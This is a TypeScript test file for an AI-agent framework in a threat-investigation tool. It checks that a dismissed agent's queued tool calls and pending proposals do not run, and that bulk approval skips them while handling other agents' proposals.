    await runAgentCycle(await folder('S'), settings, true, undefined, builtin('ap-threat-hunter'), await db.agentDeployments.get('dep-hunter'));

    expect(await db.agentDeployments.get('dep-hunter')).toBeUndefined();
    expect(scriptedLLM.requests).toHaveLength(1);
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect(await hunterActions()).toEqual([]);
  });

  it('a call that would run on its own is not run once its agent is dismissed', async () => {
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY } });
    await dismissHunterDuring('fetch_url');
    scriptedLLM.script(
      { toolCalls: [{ name: 'fetch_url', input: { url: NVD } }, { name: 'read_note', input: { id: ids('S').note } }] },
      { toolCalls: [{ name: 'fetch_url', input: { url: NVD } }] },
    );
    const result = await runAgentCycle(await folder('S'), settings, true, undefined, builtin('ap-threat-hunter'), await db.agentDeployments.get('dep-hunter'));

    expect(await db.agentDeployments.get('dep-hunter')).toBeUndefined();
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect(result.autoExecuted).toEqual([]);
    expect(await hunterActions()).toEqual([]);
    expect(scriptedLLM.requests).toHaveLength(1);
    expect(result.summary?.errorHistogram).toEqual({ fetch_url: 1, read_note: 1 });
  });

  it('a proposal of an agent no longer deployed here runs neither alone nor by Approve all; legacy, supervisor, paused and resting rows do', async () => {
    await onShift('paused', 'ap-lead-analyst', { status: 'paused' });
    await onShift('resting', 'ap-digital-forensics', { shift: 'resting' });
    // Threat Hunter is still deployed, but only in another investigation.
    await onShift('elsewhere', 'ap-threat-hunter', { investigationId: 'P' });
    const row = (id: string, agentConfigId?: string, extra: Partial<AgentAction> = {}): AgentAction => ({ id, investigationId: 'S', threadId: 't', agentConfigId,
      toolName: 'create_note', toolInput: { title: `Note from ${id}` }, rationale: 'Proposed', status: 'pending', createdAt: 1, ...extra });
    await db.agentActions.bulkAdd([row('dismissed', 'ap-threat-hunter'), row('legacy'), row('paused', 'ap-lead-analyst'), row('resting', 'ap-digital-forensics'),
      row('supervisor', 'caddy-supervisor', { toolName: 'update_ioc', toolInput: { id: ids('S').ioc, confidence: 'high' } })]);

    expect(await previewBulkApprove('S')).toEqual({ routine: 3, review: 2 });
    expect(await bulkApproveActions('S')).toEqual({ executed: 3, failed: 0, skipped: 2 });
    expect((await pendingIn('S')).map(action => action.id).sort()).toEqual(['dismissed', 'supervisor']);
    expect((await executeApprovedAction(await db.agentActions.get('supervisor') as AgentAction)).isError).toBe(false);
    expect((await db.standaloneIOCs.get(ids('S').ioc))?.confidence).toBe('high');

    const refused = await executeApprovedAction(await db.agentActions.get('dismissed') as AgentAction);
    expect(refused.isError).toBe(true);
    expect(await db.agentActions.get('dismissed')).toMatchObject({ status: 'failed' });
    const titles = (await db.notes.where('folderId').equals('S').toArray()).map(note => note.title).filter(title => title.startsWith('Note from')).sort();
    expect(titles).toEqual(['Note from legacy', 'Note from paused', 'Note from resting']);
  });
});
